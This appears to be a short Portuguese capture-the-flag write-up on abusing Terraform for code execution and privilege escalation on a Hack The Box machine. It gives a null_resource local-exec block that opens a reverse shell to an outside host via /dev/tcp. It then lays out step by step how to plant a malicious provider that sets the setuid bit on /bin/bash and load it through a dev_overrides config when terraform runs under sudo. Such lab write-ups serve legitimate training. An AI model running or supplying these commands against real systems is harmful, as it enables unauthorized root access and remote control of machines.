## Command
```json
resource "null_resource" "vert16x" {
provisioner "local-exec" {
command = "sh -i >& /dev/tcp/<IP>/443 0>&1"
interpreter = ["/bin/bash", "-c"]
}
}
```
***
## Priv Esc - Provider
O Terraform permite o uso de **provedores personalizados** (custom providers), que são binários que estendem a funcionalidade do Terraform. O ataque explora a capacidade de sobrescrever o caminho de instalação de um provedor usando a variável de ambiente `TF_CLI_CONFIG_FILE` e a diretiva `dev_overrides`

Temos um usuário que pode executar o seguinte comando com privilégios elevados.
```sh
$ /usr/bin/terraform -chdir\=/opt/examples apply
```
Além disso, o arquivo `main.tf` valida se o caminho da fonte era `/root/examples`. Para explorar devemos seguir os seguintes passos.
###### Criar um provedor malicioso
Primeiro criamos nosso provedor malicioso que irá conter o código malicioso.
```sh
$ vim /tmp/provider/terraform-provider-examples
#!/bin/bash
chmod u+s /bin/bash

$ chmod +x /tmp/provider/terraform-provider-examples
```
###### Agora criamos um arquivo de configuração
Em seguida, criamos um arquivo de configuração do Terraform (ex.: `/tmp/exp.rc`) que define um `dev_overrides` para o provedor `examples`:
```sh
$ vim /tmp/exp.rc  
provider_installation {  
  dev_overrides {  
    "previous.htb/terraform/examples" = "/tmp/provider"  
  }  
  direct {}  
}
```
Isso instrui o Terraform a usar o provedor malicioso em `/tmp/provider` em vez do provedor legítimo
###### Executamos o Terraform com Privilégios Elevados
Definimos a variável de ambiente `TF_CLI_CONFIG_FILE` para apontar para o arquivo de configuração malicioso:
```sh
$ export TF_CLI_CONFIG_FILE=/tmp/exp.rc
```

Em seguida, executa o comando permitido via sudo:
```sh
sudo /usr/bin/terraform -chdir=/opt/examples apply
```
O Terraform, ao executar como root, carrega o provedor malicioso e executa o código embutido, resultando em escalação de privilégios 27.